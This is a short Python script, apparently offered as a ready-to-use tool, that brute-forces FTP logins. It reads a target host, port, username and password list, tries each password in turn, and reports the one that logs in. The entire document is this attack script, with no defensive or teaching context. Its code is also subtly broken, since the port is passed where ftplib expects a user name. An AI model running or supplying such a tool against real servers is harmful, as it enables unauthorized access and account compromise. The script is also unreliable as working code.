from colorama import Fore, init
import ftplib
try:
    userhost = input ("Input host : ")
    port = input("Input Port: ")
    userlogin = input ("Input login : ")
    userword = input ("Input PassList : ")
    def brute():
        
        wordlist = open(userword,"r",encoding='utf-8', errors='ignore')
        for line in wordlist:
            try:
                conect = ftplib.FTP(userhost, port)
                ans = conect.login(userlogin.strip(), line.strip())
                
                if ans ==  "230 Login successful.":
                    print (Fore.GREEN + userhost + " PassFound ", line)
                    break 
            except ftplib.error_perm:  
                print (Fore.RED + "PassErr", line)
    brute()
except KeyboardInterrupt:
    print(Fore.GREEN + "\nGoodbye :)")
